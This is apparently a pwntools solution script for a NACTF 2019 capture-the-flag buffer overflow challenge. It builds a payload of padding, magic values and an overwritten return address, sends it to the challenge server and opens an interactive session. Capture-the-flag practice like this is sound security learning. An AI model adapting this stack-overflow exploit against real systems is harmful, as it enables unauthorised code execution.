from pwn import *

context.terminal  = ['tmux','splitw','-h']

p = remote ('shell.2019.nactf.com','31184')
#p = process('./bof')
#gdb.attach(proc.pidof(p)[0])


payload = "A"*8
payload += p32(0xF00DB4BE)
payload += p32(0x14B4DA55)
payload += "A"*8
payload += "B"*4

payload += p32(0x080491fc)
#payload += p32(0x080491c2)

payload += p32(0xf4bdfeff)
payload += p32(0x14B4DA55)
payload += p32(0xF00DB4BE)








p.sendline(payload)
s = p.recv(2048)
print s
#print payload 
p.interactive()

